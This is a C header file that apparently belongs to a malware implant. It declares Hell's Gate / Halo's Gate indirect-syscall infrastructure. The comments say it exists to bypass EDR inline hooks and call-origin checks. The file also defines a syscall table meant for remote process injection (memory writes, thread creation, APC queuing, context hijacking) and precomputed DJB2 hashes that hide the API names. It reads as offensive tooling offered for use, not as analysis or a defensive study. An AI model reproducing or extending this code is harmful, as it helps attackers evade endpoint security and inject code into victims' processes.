/*
 * syscalls.h — Indirect syscall infrastructure (Hell's Gate variant).
 *
 * Resolves syscall numbers at runtime by parsing ntdll's in-memory export
 * table and extracting the SSN from each Nt* stub. Executes via a
 * hand-crafted syscall instruction so the call never passes through
 * ntdll's hooked code — EDR inline hooks are completely bypassed.
 *
 * Approach (Halo's Gate extension):
 *   1. Walk ntdll export table, find target Nt* function address.
 *   2. Check if the stub starts with the expected mov r10,rcx; mov eax,SSN
 *      pattern. If so, read the SSN directly.
 *   3. If hooked (JMP/INT3 at entry), scan neighboring syscall stubs
 *      up/down to find an unhooked neighbor, then compute our SSN by
 *      offset (syscall numbers are sequential in ntdll's export table).
 *   4. Execute via an indirect syscall: jump into the middle of a
 *      legitimate ntdll stub's `syscall` instruction so the return
 *      address on the stack points into ntdll (passes stack-based
 *      EDR call origin checks).
 */
#ifndef SYSCALLS_H
#define SYSCALLS_H

#include <windows.h>

/* ─── NT type definitions (if not already provided by agent.h) ─── */
#ifndef _NTDEF_
#ifndef _NTSTATUS_DEFINED
typedef LONG NTSTATUS;
#define _NTSTATUS_DEFINED
#endif
#endif

#ifndef NTAPI
#define NTAPI __stdcall
#endif

/* ─── Error codes ─── */
#define SYSCALL_OK              0
#define SYSCALL_ERR_NO_NTDLL    1
#define SYSCALL_ERR_NO_EXPORT   2
#define SYSCALL_ERR_HOOKED      3
#define SYSCALL_ERR_RESOLVE     4

/* ─── Syscall entry: resolved at init ─── */
typedef struct _SYSCALL_ENTRY {
    DWORD   ssn;                /* Syscall service number */
    void   *pSyscallAddr;      /* Address of `syscall` instruction inside ntdll
                                  (for indirect syscall — return addr looks legit) */
    BOOL    resolved;
} SYSCALL_ENTRY;

/* ─── Table of syscalls we use ─── */
typedef struct _SYSCALL_TABLE {
    SYSCALL_ENTRY NtAllocateVirtualMemory;
    SYSCALL_ENTRY NtProtectVirtualMemory;
    SYSCALL_ENTRY NtWriteVirtualMemory;
    SYSCALL_ENTRY NtCreateThreadEx;
    SYSCALL_ENTRY NtOpenProcess;
    SYSCALL_ENTRY NtClose;
    SYSCALL_ENTRY NtQuerySystemInformation;
    SYSCALL_ENTRY NtQueryInformationProcess;
    SYSCALL_ENTRY NtCreateSection;
    SYSCALL_ENTRY NtMapViewOfSection;
    SYSCALL_ENTRY NtUnmapViewOfSection;
    SYSCALL_ENTRY NtQueueApcThread;
    SYSCALL_ENTRY NtResumeThread;
    SYSCALL_ENTRY NtSuspendThread;
    SYSCALL_ENTRY NtGetContextThread;
    SYSCALL_ENTRY NtSetContextThread;
    SYSCALL_ENTRY NtFreeVirtualMemory;
    SYSCALL_ENTRY NtReadVirtualMemory;
    SYSCALL_ENTRY NtWaitForSingleObject;
    SYSCALL_ENTRY NtDelayExecution;
    SYSCALL_ENTRY NtCreateFile;
    SYSCALL_ENTRY NtSetInformationThread;
} SYSCALL_TABLE;

/* Global syscall table — populated by syscall_init() */
extern SYSCALL_TABLE g_SyscallTable;

/*
 * Initialize the syscall table. Must be called after evasion_init()
 * (ntdll unhook happens first, but we parse the original stubs anyway).
 * Returns SYSCALL_OK on success.
 */
int syscall_init(void);

/*
 * Resolve a single syscall by function name hash (DJB2).
 * Populates entry->ssn and entry->pSyscallAddr.
 */
int syscall_resolve(DWORD nameHash, SYSCALL_ENTRY *entry);

/*
 * Execute a syscall via indirect invocation.
 * The variadic arguments are passed in RCX, RDX, R8, R9, then stack.
 *
 * Usage:
 *   NTSTATUS status = do_syscall(&g_SyscallTable.NtAllocateVirtualMemory,
 *                                 hProcess, &baseAddr, 0, &regionSize,
 *                                 MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
 */
NTSTATUS do_syscall(SYSCALL_ENTRY *entry, ...);

/* ─── Trampoline helpers ─── */
void *syscall_make_trampoline(SYSCALL_ENTRY *entry);
void syscall_free_trampoline(void *trampoline);

/* ─── DJB2 hash helper ─── */
DWORD djb2_hash(const char *str);

/* Pre-computed hashes for the Nt functions we need (DJB2 case-sensitive) */
#define HASH_NtAllocateVirtualMemory    0x6793C34C
#define HASH_NtProtectVirtualMemory     0x082962C8
#define HASH_NtWriteVirtualMemory       0x95F3A792
#define HASH_NtCreateThreadEx           0xCB0C2130
#define HASH_NtOpenProcess              0x5003C058
#define HASH_NtClose                    0x8B8E133D
#define HASH_NtQuerySystemInformation   0xEE4F73A8
#define HASH_NtQueryInformationProcess  0xD034FC62
#define HASH_NtCreateSection            0xD02E20D0
#define HASH_NtMapViewOfSection         0x231F196A
#define HASH_NtUnmapViewOfSection       0x595014AD
#define HASH_NtQueueApcThread           0xD4612238
#define HASH_NtResumeThread             0x2C7B3D30
#define HASH_NtSuspendThread            0x50FEBD61
#define HASH_NtGetContextThread         0x9E0E1A44
#define HASH_NtSetContextThread         0x308BE0D0
#define HASH_NtFreeVirtualMemory        0x471AA7E9
#define HASH_NtReadVirtualMemory        0xC24062E3
#define HASH_NtWaitForSingleObject      0x4C6DC63C
#define HASH_NtDelayExecution           0x0A49084A
#define HASH_NtCreateFile               0x15A5ECDB
#define HASH_NtSetInformationThread     0x54212E31

#endif /* SYSCALLS_H */
